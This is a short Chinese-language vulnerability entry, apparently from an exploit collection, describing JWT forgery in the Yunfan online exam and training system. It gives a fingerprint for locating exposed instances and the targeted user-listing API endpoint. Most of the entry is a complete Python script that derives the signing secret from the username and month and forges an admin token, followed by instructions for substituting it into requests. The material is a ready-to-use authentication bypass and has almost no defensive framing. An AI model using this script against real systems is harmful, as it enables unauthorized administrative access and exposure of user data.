# 云帆在线考试培训系统存在JWT硬编码伪造

- **系统**：云帆在线考试培训系统　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`icon_hash="-1901675253"`
- **请求**：`POST /exam/api/sys/user/paging HTTP/1.1`

**请求体 / payload**
```
**jwt生成脚本如下：**
import hashlib
import base64
import json
import hmac
import calendar
from datetime import datetime, timedelta
# ==================== 配置 ====================
EXPIRE_TIME = 7 * 24 * 60 * 60 * 1000  # 7天
def md5(s: str) -> str:
return hashlib.md5(s.encode('utf-8')).hexdigest()
def encrypt_secret(username: str) -> str:
now = datetime.now()
month = now.month - 1  # 与Java保持一致
sb = f"{username}&{month}"
secret = md5(sb)
final_secret = md5(f"{username}&{secret}")
return final_secret
def base64url_encode(data: bytes) -> str:
return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
def sign(username: str) -> str:
# 1. 构建header
header = {"alg": "HS256", "typ": "JWT"}
header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
# 2. 构建payload
expire_at = int((datetime.now().timestamp() * 1000 + EXPIRE_TIME) / 1000)
payload = {"username": username, "exp": expire_at}
payload_enc = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
# 3. 生成签名
secret = encrypt_secret(username)
signature = hmac.new(
key=secret.encode('utf-8'),
msg=f"{header_enc}.{payload_enc}".encode('utf-8'),
digestmod=hashlib.sha256
)
signature_enc = base64url_encode(signature.digest())
# 4. 拼接token
return f"{header_enc}.{payload_enc}.{signature_enc}"
# ==================== 测试 ====================
if __name__ == '__main__':
username = "admin"
token = sign(username)
print("生成成功！")
print("Token：", token)
**生成的jwt值替换token：**
Host:
token: eyJhbGciOiJIU…（脚本共 1722 字，完整版见原文）
```
- **预期**：200　|　—